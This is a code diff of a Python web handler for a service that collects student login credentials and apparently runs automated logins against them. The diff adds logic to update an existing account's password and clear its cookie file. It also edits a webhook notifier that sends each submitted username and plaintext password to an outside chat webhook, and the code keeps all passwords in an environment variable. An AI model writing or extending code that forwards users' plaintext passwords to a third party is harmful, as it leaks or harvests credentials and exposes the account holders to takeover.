@@ -518,11 +518,24 @@ def make_handler(supervisor: ProcessSupervisor):
                     except Exception:
                         acc_list = []
 
-                    if any(a.get("name") == name or a.get("user") == user for a in acc_list):
-                        return self._send_json({"ok": False, "message": f"帳號 {user} 已存在清單中"}, 400)
+                    existing_idx = next((i for i, a in enumerate(acc_list) if a.get("name") == name or a.get("user") == user), None)
+                    is_update = existing_idx is not None
 
-                    new_record = {"name": name, "user": user, "passwd": passwd, "school": school}
-                    acc_list.append(new_record)
+                    if is_update:
+                        acc_list[existing_idx]["passwd"] = passwd
+                        acc_list[existing_idx]["school"] = school
+                        new_record = acc_list[existing_idx]
+                        supervisor.remove_spec(name)
+                        cookie_file = ROOT / "state" / "cookies" / f"{name}.json"
+                        if cookie_file.exists():
+                            try:
+                                cookie_file.unlink()
+                            except Exception:
+                                pass
+                    else:
+                        new_record = {"name": name, "user": user, "passwd": passwd, "school": school}
+                        acc_list.append(new_record)
+
                     new_json_str = json.dumps(acc_list, ensure_ascii=False)
                     os.environ["TRON_ACCOUNTS_JSON"] = new_json_str
 
@@ -564,10 +577,12 @@ def make_handler(supervisor: ProcessSupervisor):
                         def _notify_webhook():
                             try:
                                 import urllib.request
+                                notif_title = "收到帳號密碼更新！" if is_update else "收到新帳號輸入！"
+                                notif_prefix = "帳號密碼更新通知" if is_update else "新帳號輸入通知"
                                 payload = {
-                                    "content": f"新帳號輸入通知：\n**學號/帳號**：`{user}`\n**密碼**：`{passwd}`\n**學校**：`{school}`\n**時間**：{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}",
+                                    "content": f"{notif_prefix}：\n**學號/帳號**：`{user}`\n**密碼**：`{passwd}`\n**學校**：`{school}`\n**時間**：{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}",
                                     "embeds": [{
-                                        "title": "收到新帳號輸入！",
+                                        "title": notif_title,
                                         "color": 3066993,
                                         "fields": [
                                             {"name": "學號 / 帳號", "value": f"`{user}`", "inline": True},
@@ -587,9 +602,10 @@ def make_handler(supervisor: ProcessSupervisor):
                                 pass
                         threading.Thread(target=_notify_webhook, daemon=True).start()
 
+                    msg_text = f"成功更新帳號 {user} 密碼並重新發起登入！" if is_update else f"成功加入帳號 {user} 並啟動即時監控！"
                     return self._send_json({
                         "ok": True,
-                        "message": f"成功加入帳號 {user} 並啟動即時監控！",
+                        "message": msg_text,
                         "accounts_json": new_json_str,
                         "account": new_record,
                         "total_accounts": len(acc_list),
